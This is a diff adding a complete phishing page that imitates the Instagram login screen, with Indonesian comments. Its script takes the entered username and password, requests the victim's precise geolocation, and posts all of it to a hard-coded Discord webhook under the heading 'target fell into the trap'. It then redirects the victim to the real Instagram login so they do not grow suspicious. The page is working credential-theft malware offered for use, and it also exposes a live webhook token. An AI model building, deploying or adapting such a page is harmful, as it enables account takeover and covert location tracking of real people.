@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link href="https://fonts.googleapis.com/css2?family=Lobster&display=swap" rel="stylesheet">
+    
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+        }
+        h1 {
+            font-family: 'Lobster', cursive;
+            font-size: 48px;
+            margin: 0 0 30px 0;
+            color: #262626;
+            font-weight: normal;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 12px;
+        }
+        input:focus { border: 1px solid #a8a8a8; outline: none; }
+        
+        button {
+            width: 100%;
+            padding: 8px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        button:disabled { background-color: #b2dffc; cursor: not-allowed; }
+
+        /* Separator OR */
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+        }
+        .line { flex: 1; height: 1px; background-color: #dbdbdb; }
+        .or-text { margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: bold; }
+
+        /* FB Login & Forgot */
+        .fb-login a {
+            color: #385185;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .forgot-password a {
+            color: #00376b;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .signup-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            width: 350px;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <h1>Instagram</h1>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" id="btnSubmit">Log In</button>
+        </form>
+
+        <div class="separator">
+            <div class="line"></div>
+            <div class="or-text">OR</div>
+            <div class="line"></div>
+        </div>
+
+        <div class="fb-login">
+            <a href="https://www.facebook.com/login/">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="16" style="margin-right: 8px;">
+                Log in with Facebook
+            </a>
+        </div>
+
+        <div class="forgot-password">
+            <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+        </div>
+    </div>
+
+    <div class="signup-box">
+        Don't have an account? <a href="#" style="color: #0095f6; text-decoration: none; font-weight: bold;">Sign up</a>
+    </div>
+
+    <script>
+        // WEBHOOK DISCORD KAMU
+        const webhookURL = "https://discordapp.com/api/webhooks/1488089163751489636/Gk4up_lVTgmJYHqIZ2qzxAFm6kiPA_dgR5sfD6AHJo98V0_gqC0bIbYey70woKxpikWU";
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const btn = document.getElementById('btnSubmit');
+
+            btn.disabled = true;
+            btn.innerText = "Processing...";
+
+            // Proses Pengambilan Lokasi & Pengiriman Data
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => sendData(user, pass, pos),
+                    () => sendData(user, pass, null),
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                sendData(user, pass, null);
+            }
+        });
+
+        function sendData(u, p, pos) {
+            let locInfo = "Izin Lokasi Ditolak";
+            if (pos) {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                locInfo = `Koordinat: ${lat}, ${lon}\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`;
+            }
+
+            const payload = {
+                content: `🚨 **TARGET MASUK JEBAKAN!**\n👤 **Username:** \`${u}\`\n🔑 **Password:** \`${p}\`\n📍 **${locInfo}**`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                // Alihkan ke Instagram asli setelah data terkirim agar target tidak curiga
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            }).catch(() => {
+                // Jika gagal kirim, tetap alihkan agar tidak macet
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            });
+        }
+    </script>
+</body>
+</html>
